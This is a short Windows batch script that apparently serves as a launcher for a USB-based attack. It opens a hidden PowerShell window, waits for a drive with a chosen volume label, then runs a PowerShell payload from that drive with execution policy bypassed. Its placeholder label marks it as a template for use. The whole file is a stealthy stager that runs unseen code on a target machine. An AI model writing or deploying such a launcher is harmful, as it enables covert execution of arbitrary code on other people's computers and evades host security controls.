@echo off
set LABEL=PUT_HERE_YOUR_USB_LABEL
set PAYLOAD_PATH=\Payload.ps1
powershell -W H $l='%LABEL%'; while (!((Get-WmiObject Win32_LogicalDisk).VolumeName -eq "$l")) {}; powershell -Ex Bypass ((Get-WmiObject Win32_LogicalDisk ^| Where-Object {$_.VolumeName -eq "$l"} ^| Select-Object DeviceID).DeviceID + '%PAYLOAD_PATH%')
